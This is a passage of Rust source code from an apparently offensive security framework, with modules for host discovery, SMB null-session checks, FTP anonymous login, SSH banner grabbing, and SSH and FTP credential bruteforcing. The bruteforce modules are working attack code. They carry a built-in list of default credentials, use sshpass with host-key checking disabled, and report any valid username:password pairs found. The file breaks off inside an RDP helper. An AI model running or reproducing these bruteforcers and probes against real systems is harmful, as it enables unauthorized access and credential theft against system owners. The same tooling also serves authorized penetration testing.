use crate::core::module::{Module, ModuleError, ModuleResult};
use async_trait::async_trait;
use icebox_macro::module;
use std::sync::Arc;
use tokio::sync::Semaphore;

use crate::modules::hex_encode;

#[module(
    name = "arp_scanner",
    kind = "Scanner",
    description = "Discover live hosts on the local network via ICMP ping sweep",
    author = "ICEBOX"
)]
pub struct ArpScanner {
    #[option(
        required = true,
        help = "Target range: CIDR (192.168.1.0/24), range (192.168.1.1-100), or list (192.168.1.1,192.168.1.2)"
    )]
    pub targets: String,
    #[option(help = "Timeout per host in seconds (default 2)")]
    pub timeout_secs: u64,
    #[option(help = "Maximum concurrent probes (default 50)")]
    pub concurrency: usize,
}

fn parse_target_list(spec: &str) -> Result<Vec<String>, ModuleError> {
    let mut ips = Vec::new();
    for part in spec.split(',') {
        let part = part.trim();
        if part.is_empty() {
            continue;
        }
        if let Some((base, cidr)) = part.split_once('/') {
            let prefix: u8 = cidr
                .parse()
                .map_err(|_| ModuleError::Parse(format!("bad CIDR: {cidr}")))?;
            let base_ip: std::net::Ipv4Addr = base
                .parse()
                .map_err(|_| ModuleError::Parse(format!("bad IP: {base}")))?;
            let bits = 32u32 - prefix as u32;
            let count = 1u32 << bits;
            let start = u32::from(base_ip) & (0xFFFFFFFFu32 << bits);
            let network = std::net::Ipv4Addr::from(start);
            let broadcast = std::net::Ipv4Addr::from(start | (count - 1));
            for i in 1..count - 1 {
                let ip = std::net::Ipv4Addr::from(start + i);
                if ip != network && ip != broadcast {
                    ips.push(ip.to_string());
                }
            }
        } else if let Some((lo, hi)) = part.split_once('-') {
            let base_parts: Vec<&str> = lo.split('.').collect();
            if base_parts.len() != 4 {
                return Err(ModuleError::Parse("bad IP range format".into()));
            }
            let lo_octet: u8 = lo
                .rsplit_once('.')
                .map(|(_, o)| o)
                .unwrap_or("")
                .parse()
                .map_err(|_| ModuleError::Parse("bad range".into()))?;
            let hi_octet: u8 = hi
                .trim()
                .parse()
                .map_err(|_| ModuleError::Parse("bad range".into()))?;
            let prefix = lo.rsplit_once('.').map(|(p, _)| p).unwrap_or("");
            for i in lo_octet..=hi_octet {
                ips.push(format!("{prefix}.{i}"));
            }
        } else {
            ips.push(part.to_string());
        }
    }
    if ips.is_empty() {
        return Err(ModuleError::Other("no targets specified".into()));
    }
    Ok(ips)
}

#[async_trait]
impl Module for ArpScanner {
    fn options_json(&self) -> serde_json::Value {
        serde_json::to_value(&ArpScannerOptions {
            targets: self.targets.clone(),
            timeout_secs: self.timeout_secs,
            concurrency: self.concurrency,
        })
        .unwrap_or(serde_json::Value::Null)
    }

    fn set_option(&mut self, name: &str, value: &str) -> Result<(), ModuleError> {
        let mut o = ArpScannerOptions {
            targets: self.targets.clone(),
            timeout_secs: self.timeout_secs,
            concurrency: self.concurrency,
        };
        o.set(name, value)?;
        self.targets = o.targets;
        self.timeout_secs = o.timeout_secs;
        self.concurrency = o.concurrency;
        Ok(())
    }

    fn validate(&self) -> Result<(), ModuleError> {
        ArpScannerOptions {
            targets: self.targets.clone(),
            timeout_secs: self.timeout_secs,
            concurrency: self.concurrency,
        }
        .validate()?;
        parse_target_list(&self.targets).map(|_| ())
    }

    async fn run(&self) -> Result<ModuleResult, ModuleError> {
        let ips = parse_target_list(&self.targets)?;
        let timeout = if self.timeout_secs > 0 {
            self.timeout_secs
        } else {
            2
        };
        let max_concurrency = if self.concurrency > 0 {
            self.concurrency
        } else {
            50
        };
        let semaphore = Arc::new(Semaphore::new(max_concurrency));

        let mut handles = Vec::new();
        for ip in ips {
            let permit = semaphore
                .clone()
                .acquire_owned()
                .await
                .map_err(|e| ModuleError::Other(e.to_string()))?;
            handles.push(tokio::spawn(async move {
                let _permit = permit;
                let result = tokio::process::Command::new("ping")
                    .arg("-c")
                    .arg("1")
                    .arg("-W")
                    .arg(timeout.to_string())
                    .arg(&ip)
                    .output()
                    .await;
                match result {
                    Ok(out) if out.status.success() => Some(ip),
                    _ => None,
                }
            }));
        }

        let mut live_hosts: Vec<String> = Vec::new();
        for h in handles {
            if let Ok(Some(ip)) = h.await {
                live_hosts.push(ip);
            }
        }
        live_hosts.sort();
        live_hosts.dedup();

        let finding = if live_hosts.is_empty() {
            "No live hosts found".to_string()
        } else {
            format!(
                "Found {} live host(s): {}",
                live_hosts.len(),
                live_hosts.join(", ")
            )
        };

        Ok(ModuleResult {
            success: true,
            finding: Some(finding),
            evidence: live_hosts.iter().map(|h| format!("host/{h}")).collect(),
            data: serde_json::json!({
                "targets": self.targets,
                "live_hosts": live_hosts,
                "count": live_hosts.len(),
            }),
            ..Default::default()
        })
    }
}

#[module(
    name = "smb_scanner",
    kind = "Scanner",
    description = "SMB service scanner  -  version detection and null session check",
    author = "ICEBOX"
)]
pub struct SmbScanner {
    #[option(required = true, help = "Target IP or hostname")]
    pub host: String,
    #[option(help = "SMB port (default 445)")]
    pub port: u16,
    #[option(help = "Timeout in milliseconds (default 5000)")]
    pub timeout_ms: u64,
    #[option(help = "Check null session on IPC$ (default true)")]
    pub check_null_session: bool,
}

fn build_smb_negotiate() -> Vec<u8> {
    let mut pkt = Vec::new();
    pkt.extend_from_slice(b"\xFFSMB");
    pkt.push(0x72);
    pkt.extend_from_slice(&[0x00; 4]);
    pkt.push(0x18);
    pkt.extend_from_slice(&[0x01, 0x48]);
    pkt.extend_from_slice(&[0x00; 12]);
    pkt.extend_from_slice(&[0x00; 2]);
    pkt.extend_from_slice(&[0x00; 2]);
    pkt.extend_from_slice(&[0x00; 2]);
    pkt.extend_from_slice(&[0x00; 2]);
    pkt.push(0x00);
    let dialects = b"\x02\x0BNT LM 0.12\x02\x08SMB 2.002";
    let bcc = dialects.len() as u16;
    pkt.extend_from_slice(&bcc.to_le_bytes());
    pkt.extend_from_slice(dialects);
    pkt
}

fn parse_smb_negotiate_response(data: &[u8]) -> (Option<String>, Option<u16>) {
    if data.len() < 36 || data[0..4] != [0xFF, b'S', b'M', b'B'] {
        return (None, None);
    }
    let cmd = data[4];
    if cmd != 0x72 {
        return (None, None);
    }
    let mut status_bytes = [0u8; 4];
    status_bytes.copy_from_slice(&data[5..9]);
    let status = u32::from_le_bytes(status_bytes);
    if status != 0 {
        return (Some("SMB present (non-zero status)".into()), None);
    }
    let wct = data[32] as usize;
    if wct == 0 || data.len() < 33 + wct * 2 + 2 {
        return (Some("SMBv1 present".into()), None);
    }
    if wct >= 1 {
        let dialect_idx = u16::from_le_bytes([data[33], data[34]]);
        if dialect_idx == 0xFFFF {
            return (Some("SMBv1 present (no dialect selected)".into()), None);
        }
        let bcc_start = 33 + wct * 2;
        if data.len() > bcc_start + 1 {
            let bcc = u16::from_le_bytes([data[bcc_start], data[bcc_start + 1]]);
            let version = if wct == 1 {
                if data.len() >= 33 + wct * 2 + 2 + 4 {
                    let dialect_rev =
                        u16::from_le_bytes([data[bcc_start + 2 + 32], data[bcc_start + 2 + 33]]);
                    Some(format!("SMBv2 (dialect 0x{dialect_rev:04x})"))
                } else {
                    Some("SMBv2 present".into())
                }
            } else {
                let sec_mode = data[35];
                let caps_start = 33 + 2 + 4 + 2 + 2 + 4 + 4;
                if data.len() > caps_start + 3 {
                    let caps = u32::from_le_bytes([
                        data[caps_start],
                        data[caps_start + 1],
                        data[caps_start + 2],
                        data[caps_start + 3],
                    ]);
                    Some(format!(
                        "SMBv1 (security=0x{sec_mode:02x}, caps=0x{caps:08x})"
                    ))
                } else {
                    Some(format!("SMBv1 (security=0x{sec_mode:02x})"))
                }
            };
            return (version, Some(bcc));
        }
    }
    (Some("SMB present".into()), None)
}

#[async_trait]
impl Module for SmbScanner {
    fn options_json(&self) -> serde_json::Value {
        serde_json::to_value(&SmbScannerOptions {
            host: self.host.clone(),
            port: self.port,
            timeout_ms: self.timeout_ms,
            check_null_session: self.check_null_session,
        })
        .unwrap_or(serde_json::Value::Null)
    }

    fn set_option(&mut self, name: &str, value: &str) -> Result<(), ModuleError> {
        let mut o = SmbScannerOptions {
            host: self.host.clone(),
            port: self.port,
            timeout_ms: self.timeout_ms,
            check_null_session: self.check_null_session,
        };
        o.set(name, value)?;
        self.host = o.host;
        self.port = o.port;
        self.timeout_ms = o.timeout_ms;
        self.check_null_session = o.check_null_session;
        Ok(())
    }

    fn validate(&self) -> Result<(), ModuleError> {
        SmbScannerOptions {
            host: self.host.clone(),
            port: self.port,
            timeout_ms: self.timeout_ms,
            check_null_session: self.check_null_session,
        }
        .validate()
    }

    async fn run(&self) -> Result<ModuleResult, ModuleError> {
        let port = if self.port > 0 { self.port } else { 445 };
        let timeout = if self.timeout_ms > 0 {
            std::time::Duration::from_millis(self.timeout_ms)
        } else {
            std::time::Duration::from_secs(5)
        };
        let addr = crate::core::proxy::resolve_dial(&self.host, port);

        let stream =
            match tokio::time::timeout(timeout, tokio::net::TcpStream::connect(&addr)).await {
                Ok(Ok(s)) => s,
                Ok(Err(e)) => return Err(ModuleError::Other(format!("connection failed: {e}"))),
                Err(_) => return Err(ModuleError::Other("connection timed out".into())),
            };

        let req = build_smb_negotiate();
        if tokio::time::timeout(timeout, stream.writable())
            .await
            .is_err()
        {
            return Err(ModuleError::Other("write timeout".into()));
        }
        let _ = stream.try_write(&req);

        let mut buf = vec![0u8; 4096];
        let n = match tokio::time::timeout(timeout, stream.readable()).await {
            Ok(Ok(_)) => stream.try_read(&mut buf).unwrap_or(0),
            _ => 0,
        };
        if n < 36 {
            return Ok(ModuleResult {
                success: true,
                finding: Some("SMB: no valid response received".into()),
                data: serde_json::json!({"host": self.host, "port": port}),
                ..Default::default()
            });
        }

        let (version, _bcc) = parse_smb_negotiate_response(&buf[..n]);
        let mut evidence = Vec::new();
        let mut findings = Vec::new();

        if let Some(ref ver) = version {
            evidence.push(format!("smb/{ver}"));
            findings.push(ver.clone());
        } else {
            evidence.push("smb/unrecognized".into());
            findings.push("SMB service detected (unrecognized version)".into());
        }

        let null_session = if self.check_null_session {
            let tcon_req = build_smb_treeconnect(&format!("\\\\{}\\IPC$", self.host), 0);
            let _ = stream.try_write(&tcon_req);
            let mut buf2 = vec![0u8; 1024];
            let n2 = match tokio::time::timeout(timeout, stream.readable()).await {
                Ok(Ok(_)) => stream.try_read(&mut buf2).unwrap_or(0),
                _ => 0,
            };
            if n2 >= 36 && buf2[5..9] == [0x00, 0x00, 0x00, 0x00] {
                findings.push("NULL session: IPC$ accessible (likely vulnerable)".into());
                evidence.push("smb/null_session/ipc".into());
                true
            } else {
                false
            }
        } else {
            false
        };

        let mut finding_str = findings.join("; ");
        if null_session {
            finding_str.push_str("  -  WARNING: Null session allowed!");
        }

        Ok(ModuleResult {
            success: true,
            finding: Some(finding_str),
            evidence,
            data: serde_json::json!({
                "host": self.host,
                "port": port,
                "version": version,
                "null_session": null_session,
            }),
            ..Default::default()
        })
    }
}

fn build_smb_treeconnect(path: &str, uid: u16) -> Vec<u8> {
    let mut pkt = Vec::new();
    pkt.extend_from_slice(b"\xFFSMB");
    pkt.push(0x75);
    pkt.extend_from_slice(&[0x00; 4]);
    pkt.push(0x18);
    pkt.extend_from_slice(&[0x01, 0x48]);
    pkt.extend_from_slice(&[0x00; 12]);
    pkt.extend_from_slice(&[0x00; 2]);
    pkt.extend_from_slice(&[0x00; 2]);
    pkt.extend_from_slice(&uid.to_le_bytes());
    pkt.extend_from_slice(&[0x00; 2]);
    pkt.push(0x04);
    pkt.extend_from_slice(&[0x00; 2]);
    pkt.extend_from_slice(&[0x00; 2]);
    let path_bytes = path.as_bytes();
    let bcc = 1 + 4 + path_bytes.len();
    pkt.extend_from_slice(&(bcc as u16).to_le_bytes());
    pkt.push(0x04);
    pkt.extend_from_slice(&(path_bytes.len() as u16).to_le_bytes());
    pkt.extend_from_slice(path_bytes);
    pkt
}

#[module(
    name = "ftp_scanner",
    kind = "Scanner",
    description = "FTP service scanner  -  anonymous login check and banner grab",
    author = "ICEBOX"
)]
pub struct FtpScanner {
    #[option(required = true, help = "Target IP or hostname")]
    pub host: String,
    #[option(help = "FTP port (default 21)")]
    pub port: u16,
    #[option(help = "Timeout in milliseconds (default 5000)")]
    pub timeout_ms: u64,
    #[option(help = "Try anonymous login (default true)")]
    pub check_anonymous: bool,
}

#[async_trait]
impl Module for FtpScanner {
    fn options_json(&self) -> serde_json::Value {
        serde_json::to_value(&FtpScannerOptions {
            host: self.host.clone(),
            port: self.port,
            timeout_ms: self.timeout_ms,
            check_anonymous: self.check_anonymous,
        })
        .unwrap_or(serde_json::Value::Null)
    }

    fn set_option(&mut self, name: &str, value: &str) -> Result<(), ModuleError> {
        let mut o = FtpScannerOptions {
            host: self.host.clone(),
            port: self.port,
            timeout_ms: self.timeout_ms,
            check_anonymous: self.check_anonymous,
        };
        o.set(name, value)?;
        self.host = o.host;
        self.port = o.port;
        self.timeout_ms = o.timeout_ms;
        self.check_anonymous = o.check_anonymous;
        Ok(())
    }

    fn validate(&self) -> Result<(), ModuleError> {
        FtpScannerOptions {
            host: self.host.clone(),
            port: self.port,
            timeout_ms: self.timeout_ms,
            check_anonymous: self.check_anonymous,
        }
        .validate()
    }

    async fn run(&self) -> Result<ModuleResult, ModuleError> {
        let port = if self.port > 0 { self.port } else { 21 };
        let timeout = std::time::Duration::from_millis(if self.timeout_ms > 0 {
            self.timeout_ms
        } else {
            5000
        });
        let addr = crate::core::proxy::resolve_dial(&self.host, port);

        let stream =
            match tokio::time::timeout(timeout, tokio::net::TcpStream::connect(&addr)).await {
                Ok(Ok(s)) => s,
                Ok(Err(e)) => return Err(ModuleError::Other(format!("connection failed: {e}"))),
                Err(_) => return Err(ModuleError::Other("connection timed out".into())),
            };

        async fn read_response(
            s: &tokio::net::TcpStream,
            t: std::time::Duration,
        ) -> Result<String, ModuleError> {
            let mut buf = vec![0u8; 4096];
            let n = match tokio::time::timeout(t, s.readable()).await {
                Ok(Ok(_)) => s.try_read(&mut buf).unwrap_or(0),
                _ => return Err(ModuleError::Other("read timeout".into())),
            };
            Ok(String::from_utf8_lossy(&buf[..n.min(4000)]).to_string())
        }

        async fn send_command(
            s: &tokio::net::TcpStream,
            cmd: &[u8],
            t: std::time::Duration,
        ) -> Result<(), ModuleError> {
            match tokio::time::timeout(t, s.writable()).await {
                Ok(Ok(_)) => {
                    s.try_write(cmd)
                        .map_err(|e| ModuleError::Other(format!("write: {e}")))?;
                    Ok(())
                }
                _ => Err(ModuleError::Other("write timeout".into())),
            }
        }

        let banner = read_response(&stream, timeout).await.unwrap_or_default();
        let banner_short = banner.lines().next().unwrap_or(&banner).trim().to_string();

        let mut findings = Vec::new();
        let mut evidence = Vec::new();
        findings.push(format!("banner: {banner_short}"));

        let anonymous_success = if self.check_anonymous {
            send_command(&stream, b"USER anonymous\r\n", timeout)
                .await
                .ok();
            let user_resp = read_response(&stream, timeout).await.unwrap_or_default();
            let is_331 = user_resp.starts_with("331");
            if is_331 {
                send_command(&stream, b"PASS anonymous@\r\n", timeout)
                    .await
                    .ok();
                let pass_resp = read_response(&stream, timeout).await.unwrap_or_default();
                let logged_in = pass_resp.starts_with("230");
                if logged_in {
                    send_command(&stream, b"SYST\r\n", timeout).await.ok();
                    let syst = read_response(&stream, timeout).await.unwrap_or_default();
                    let syst_line = syst.lines().next().unwrap_or("").trim().to_string();
                    findings.push(format!("anonymous login: SUCCESS (SYST: {syst_line})"));
                    evidence.push("ftp/anonymous_login".into());

                    send_command(&stream, b"PWD\r\n", timeout).await.ok();
                    let pwd = read_response(&stream, timeout).await.unwrap_or_default();
                    let pwd_line = pwd.lines().next().unwrap_or("").trim().to_string();
                    if !pwd_line.is_empty() {
                        evidence.push(format!("ftp/pwd: {pwd_line}"));
                    }
                    true
                } else {
                    let err = pass_resp.lines().next().unwrap_or("").trim().to_string();
                    findings.push(format!("anonymous login: FAILED ({err})"));
                    false
                }
            } else {
                findings.push("anonymous login: not supported (no 331)".into());
                false
            }
        } else {
            false
        };

        let _ = stream.try_write(b"QUIT\r\n");

        let finding = if anonymous_success {
            format!(
                "FTP on tcp/{port}: {}  -  anonymous login enabled!",
                banner_short
            )
        } else {
            format!("FTP on tcp/{port}: {}", findings.join("; "))
        };

        Ok(ModuleResult {
            success: true,
            finding: Some(finding),
            evidence,
            data: serde_json::json!({
                "host": self.host,
                "port": port,
                "banner": banner_short,
                "anonymous_login": anonymous_success,
            }),
            ..Default::default()
        })
    }
}

#[module(
    name = "ssh_scanner",
    kind = "Scanner",
    description = "SSH service scanner  -  version detection and auth method enumeration",
    author = "ICEBOX"
)]
pub struct SshScanner {
    #[option(required = true, help = "Target IP or hostname")]
    pub host: String,
    #[option(help = "SSH port (default 22)")]
    pub port: u16,
    #[option(help = "Timeout in milliseconds (default 5000)")]
    pub timeout_ms: u64,
}

#[async_trait]
impl Module for SshScanner {
    fn options_json(&self) -> serde_json::Value {
        serde_json::to_value(&SshScannerOptions {
            host: self.host.clone(),
            port: self.port,
            timeout_ms: self.timeout_ms,
        })
        .unwrap_or(serde_json::Value::Null)
    }

    fn set_option(&mut self, name: &str, value: &str) -> Result<(), ModuleError> {
        let mut o = SshScannerOptions {
            host: self.host.clone(),
            port: self.port,
            timeout_ms: self.timeout_ms,
        };
        o.set(name, value)?;
        self.host = o.host;
        self.port = o.port;
        self.timeout_ms = o.timeout_ms;
        Ok(())
    }

    fn validate(&self) -> Result<(), ModuleError> {
        SshScannerOptions {
            host: self.host.clone(),
            port: self.port,
            timeout_ms: self.timeout_ms,
        }
        .validate()
    }

    async fn run(&self) -> Result<ModuleResult, ModuleError> {
        let port = if self.port > 0 { self.port } else { 22 };
        let timeout = std::time::Duration::from_millis(if self.timeout_ms > 0 {
            self.timeout_ms
        } else {
            5000
        });
        let addr = crate::core::proxy::resolve_dial(&self.host, port);

        let stream =
            match tokio::time::timeout(timeout, tokio::net::TcpStream::connect(&addr)).await {
                Ok(Ok(s)) => s,
                Ok(Err(e)) => return Err(ModuleError::Other(format!("connection failed: {e}"))),
                Err(_) => return Err(ModuleError::Other("connection timed out".into())),
            };

        let mut buf = vec![0u8; 4096];
        let n = match tokio::time::timeout(timeout, stream.readable()).await {
            Ok(Ok(_)) => stream.try_read(&mut buf).unwrap_or(0),
            _ => 0,
        };

        if n == 0 {
            return Ok(ModuleResult {
                success: true,
                finding: Some(format!("SSH on tcp/{port}: no banner received")),
                data: serde_json::json!({"host": self.host, "port": port}),
                ..Default::default()
            });
        }

        let raw = &buf[..n.min(1024)];
        let resp = String::from_utf8_lossy(raw).to_string();
        let banner = resp.lines().next().unwrap_or("").trim().to_string();

        let has_kex = n > banner.len() + 1;

        let mut evidence = Vec::new();
        evidence.push(format!("ssh/banner: {banner}"));

        let finding = if banner.starts_with("SSH-") {
            format!("SSH on tcp/{port}: {banner}")
        } else {
            format!("SSH on tcp/{port}: unrecognized banner: {banner}")
        };

        Ok(ModuleResult {
            success: true,
            finding: Some(finding),
            evidence,
            data: serde_json::json!({
                "host": self.host,
                "port": port,
                "banner": banner,
                "has_kex_init": has_kex,
                "raw_hex": hex_encode(&buf[..n.min(128)]),
            }),
            ..Default::default()
        })
    }
}

const SSH_COMMON_CREDS: &[(&str, &str)] = &[
    ("root", "root"),
    ("root", "admin"),
    ("root", "toor"),
    ("root", "password"),
    ("root", "1234"),
    ("root", "1"),
    ("root", "!"),
    ("root", "changeme"),
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "1234"),
    ("admin", "admin123"),
    ("administrator", "administrator"),
    ("administrator", "password"),
    ("user", "user"),
    ("user", "password"),
    ("user", "1234"),
    ("test", "test"),
    ("guest", "guest"),
    ("pi", "raspberry"),
    ("ubuntu", "ubuntu"),
    ("debian", "debian"),
    ("oracle", "oracle"),
    ("postgres", "postgres"),
    ("nagios", "nagios"),
    ("jenkins", "jenkins"),
];

#[module(
    name = "ssh_bruteforce",
    kind = "Scanner",
    capabilities = "CredentialAccess",
    intent = "Dump",
    impact = "Critical",
    description = "SSH credential bruteforcer  -  test username/password pairs via sshpass",
    author = "ICEBOX"
)]
pub struct SshBruteforce {
    #[option(required = true, help = "Target IP or hostname")]
    pub host: String,
    #[option(help = "SSH port (default 22)")]
    pub port: u16,
    #[option(
        help = "Credentials in user:pass format, comma-separated (default: built-in wordlist)"
    )]
    pub wordlist: String,
    #[option(help = "Timeout per attempt in seconds (default 5)")]
    pub timeout_secs: u64,
    #[option(help = "Maximum concurrent attempts (default 10)")]
    pub concurrency: usize,
}

fn parse_creds(wordlist: &str) -> Vec<(String, String)> {
    if wordlist.is_empty() {
        return SSH_COMMON_CREDS
            .iter()
            .map(|(u, p)| (u.to_string(), p.to_string()))
            .collect();
    }
    wordlist
        .split(',')
        .filter_map(|pair| {
            let pair = pair.trim();
            if let Some((u, p)) = pair.split_once(':') {
                let u = u.trim();
                let p = p.trim();
                if !u.is_empty() {
                    Some((u.to_string(), p.to_string()))
                } else {
                    None
                }
            } else {
                None
            }
        })
        .collect()
}

#[async_trait]
impl Module for SshBruteforce {
    fn options_json(&self) -> serde_json::Value {
        serde_json::to_value(&SshBruteforceOptions {
            host: self.host.clone(),
            port: self.port,
            wordlist: self.wordlist.clone(),
            timeout_secs: self.timeout_secs,
            concurrency: self.concurrency,
        })
        .unwrap_or(serde_json::Value::Null)
    }

    fn set_option(&mut self, name: &str, value: &str) -> Result<(), ModuleError> {
        let mut o = SshBruteforceOptions {
            host: self.host.clone(),
            port: self.port,
            wordlist: self.wordlist.clone(),
            timeout_secs: self.timeout_secs,
            concurrency: self.concurrency,
        };
        o.set(name, value)?;
        self.host = o.host;
        self.port = o.port;
        self.wordlist = o.wordlist;
        self.timeout_secs = o.timeout_secs;
        self.concurrency = o.concurrency;
        Ok(())
    }

    fn validate(&self) -> Result<(), ModuleError> {
        SshBruteforceOptions {
            host: self.host.clone(),
            port: self.port,
            wordlist: self.wordlist.clone(),
            timeout_secs: self.timeout_secs,
            concurrency: self.concurrency,
        }
        .validate()
    }

    async fn run(&self) -> Result<ModuleResult, ModuleError> {
        let port = if self.port > 0 { self.port } else { 22 };
        let timeout_secs = if self.timeout_secs > 0 {
            self.timeout_secs
        } else {
            5
        };
        let max_concurrency = if self.concurrency > 0 {
            self.concurrency
        } else {
            10
        };
        let creds = parse_creds(&self.wordlist);
        let host = self.host.clone();

        let has_sshpass = tokio::process::Command::new("which")
            .arg("sshpass")
            .output()
            .await
            .ok()
            .is_some_and(|o| o.status.success());

        if !has_sshpass {
            return Err(ModuleError::Other(
                "sshpass not found. Install with: brew install sshpass (macOS) or apt install sshpass (Linux)".into()
            ));
        }

        let semaphore = Arc::new(Semaphore::new(max_concurrency));
        let mut handles = Vec::new();

        for (user, pass) in &creds {
            let permit = match semaphore.clone().acquire_owned().await {
                Ok(p) => p,
                Err(_) => continue,
            };
            let user = user.clone();
            let pass = pass.clone();
            let host = host.clone();
            handles.push(tokio::spawn(async move {
                let _permit = permit;
                let result = tokio::process::Command::new("sshpass")
                    .arg("-p")
                    .arg(&pass)
                    .arg("ssh")
                    .arg("-o")
                    .arg("StrictHostKeyChecking=no")
                    .arg("-o")
                    .arg("UserKnownHostsFile=/dev/null")
                    .arg("-o")
                    .arg(format!("ConnectTimeout={timeout_secs}"))
                    .arg("-p")
                    .arg(port.to_string())
                    .arg(format!("{user}@{host}"))
                    .arg("id")
                    .output()
                    .await;
                match result {
                    Ok(out) if out.status.success() => {
                        let id_str = String::from_utf8_lossy(&out.stdout).trim().to_string();
                        Some((user, pass, id_str))
                    }
                    _ => None,
                }
            }));
        }

        let mut found: Vec<serde_json::Value> = Vec::new();
        for h in handles {
            if let Ok(Some((user, pass, id_str))) = h.await {
                found.push(serde_json::json!({
                    "username": user,
                    "password": pass,
                    "id": id_str,
                }));
            }
        }

        let evidence: Vec<String> = found
            .iter()
            .map(|c| {
                let u = c["username"].as_str().unwrap_or("");
                let p = c["password"].as_str().unwrap_or("");
                format!("ssh/cred:{u}:{p}")
            })
            .collect();

        let finding = if found.is_empty() {
            format!(
                "SSH bruteforce on tcp/{port}: no valid credentials found (tried {} pairs)",
                creds.len()
            )
        } else {
            let details: Vec<String> = found
                .iter()
                .map(|c| {
                    let u = c["username"].as_str().unwrap_or("");
                    let p = c["password"].as_str().unwrap_or("");
                    format!("{u}:{p}")
                })
                .collect();
            format!(
                "SSH bruteforce on tcp/{port}: FOUND {} valid credential(s): {}",
                found.len(),
                details.join(", ")
            )
        };

        Ok(ModuleResult {
            success: !found.is_empty(),
            finding: Some(finding),
            evidence,
            data: serde_json::json!({
                "host": self.host,
                "port": port,
                "found_credentials": found,
                "tried_count": creds.len(),
            }),
            ..Default::default()
        })
    }
}

#[module(
    name = "ftp_bruteforce",
    kind = "Scanner",
    capabilities = "CredentialAccess",
    intent = "Dump",
    impact = "Critical",
    description = "FTP credential bruteforcer  -  test username/password pairs via FTP protocol",
    author = "ICEBOX"
)]
pub struct FtpBruteforce {
    #[option(required = true, help = "Target IP or hostname")]
    pub host: String,
    #[option(help = "FTP port (default 21)")]
    pub port: u16,
    #[option(
        help = "Credentials in user:pass format, comma-separated (default: built-in wordlist)"
    )]
    pub wordlist: String,
    #[option(help = "Timeout per attempt in milliseconds (default 5000)")]
    pub timeout_ms: u64,
    #[option(help = "Maximum concurrent attempts (default 10)")]
    pub concurrency: usize,
}

#[async_trait]
impl Module for FtpBruteforce {
    fn options_json(&self) -> serde_json::Value {
        serde_json::to_value(&FtpBruteforceOptions {
            host: self.host.clone(),
            port: self.port,
            wordlist: self.wordlist.clone(),
            timeout_ms: self.timeout_ms,
            concurrency: self.concurrency,
        })
        .unwrap_or(serde_json::Value::Null)
    }

    fn set_option(&mut self, name: &str, value: &str) -> Result<(), ModuleError> {
        let mut o = FtpBruteforceOptions {
            host: self.host.clone(),
            port: self.port,
            wordlist: self.wordlist.clone(),
            timeout_ms: self.timeout_ms,
            concurrency: self.concurrency,
        };
        o.set(name, value)?;
        self.host = o.host;
        self.port = o.port;
        self.wordlist = o.wordlist;
        self.timeout_ms = o.timeout_ms;
        self.concurrency = o.concurrency;
        Ok(())
    }

    fn validate(&self) -> Result<(), ModuleError> {
        FtpBruteforceOptions {
            host: self.host.clone(),
            port: self.port,
            wordlist: self.wordlist.clone(),
            timeout_ms: self.timeout_ms,
            concurrency: self.concurrency,
        }
        .validate()
    }

    async fn run(&self) -> Result<ModuleResult, ModuleError> {
        let port = if self.port > 0 { self.port } else { 21 };
        let timeout = std::time::Duration::from_millis(if self.timeout_ms > 0 {
            self.timeout_ms
        } else {
            5000
        });
        let max_concurrency = if self.concurrency > 0 {
            self.concurrency
        } else {
            10
        };
        let creds = parse_creds(&self.wordlist);
        let host = self.host.clone();

        async fn try_ftp_login(
            host: &str,
            port: u16,
            user: &str,
            pass: &str,
            timeout: std::time::Duration,
        ) -> Option<(String, String)> {
            let addr = crate::core::proxy::resolve_dial(&host, port);
            let stream = tokio::time::timeout(timeout, tokio::net::TcpStream::connect(&addr))
                .await
                .ok()?
                .ok()?;
            let mut buf = vec![0u8; 4096];
            let n = tokio::time::timeout(timeout, stream.readable())
                .await
                .ok()?
                .map(|_| stream.try_read(&mut buf).unwrap_or(0))
                .unwrap_or(0);
            if n == 0 {
                return None;
            }
            let _ = stream
                .try_write(format!("USER {user}\r\n").as_bytes())
                .ok()?;
            tokio::time::sleep(std::time::Duration::from_millis(200)).await;
            let mut buf2 = vec![0u8; 4096];
            let n2 = tokio::time::timeout(timeout, stream.readable())
                .await
                .ok()?
                .map(|_| stream.try_read(&mut buf2).unwrap_or(0))
                .unwrap_or(0);
            let user_resp = String::from_utf8_lossy(&buf2[..n2.min(4000)]);
            if !user_resp.starts_with("331") && !user_resp.starts_with("230") {
                return None;
            }
            let _ = stream
                .try_write(format!("PASS {pass}\r\n").as_bytes())
                .ok()?;
            tokio::time::sleep(std::time::Duration::from_millis(200)).await;
            let mut buf3 = vec![0u8; 4096];
            let n3 = tokio::time::timeout(timeout, stream.readable())
                .await
                .ok()?
                .map(|_| stream.try_read(&mut buf3).unwrap_or(0))
                .unwrap_or(0);
            let pass_resp = String::from_utf8_lossy(&buf3[..n3.min(4000)]);
            if pass_resp.starts_with("230") {
                Some((user.to_string(), pass.to_string()))
            } else {
                None
            }
        }

        let semaphore = Arc::new(Semaphore::new(max_concurrency));
        let mut handles = Vec::new();
        for (user, pass) in &creds {
            let permit = semaphore
                .clone()
                .acquire_owned()
                .await
                .map_err(|e| ModuleError::Other(e.to_string()))?;
            let host = host.clone();
            let user = user.clone();
            let pass = pass.clone();
            handles.push(tokio::spawn(async move {
                let _permit = permit;
                try_ftp_login(&host, port, &user, &pass, timeout).await
            }));
        }

        let mut found: Vec<(String, String)> = Vec::new();
        for h in handles {
            if let Ok(Some((u, p))) = h.await {
                found.push((u, p));
            }
        }

        let evidence: Vec<String> = found
            .iter()
            .map(|(u, p)| format!("ftp/cred:{u}:{p}"))
            .collect();
        let finding = if found.is_empty() {
            format!(
                "FTP bruteforce on tcp/{port}: no valid credentials found (tried {} pairs)",
                creds.len()
            )
        } else {
            let details: Vec<String> = found.iter().map(|(u, p)| format!("{u}:{p}")).collect();
            format!(
                "FTP bruteforce on tcp/{port}: FOUND {} valid credential(s): {}",
                found.len(),
                details.join(", ")
            )
        };

        Ok(ModuleResult {
            success: !found.is_empty(),
            finding: Some(finding),
            evidence,
            data: serde_json::json!({
                "host": self.host,
                "port": port,
                "found_credentials": found,
                "tried_count": creds.len(),
            }),
            ..Default::default()
        })
    }
}

fn rdp_build_neg_req(requested: u32) -> Vec<u8> {
    let mut pkt = Vec::with_capacity(8);
    pkt.push(0x01);
    pkt.push(0x00);
    pkt.extend_from_slice(&[0x08, 0x00]);
    pkt.extend_from_slice(&requested.to_le_bytes());
    pkt
}

fn rdp_parse_neg_rsp(data: &[u8]) -> Option<(u8, u32)> {
    if data.len() < 8 {
        return None;
    }
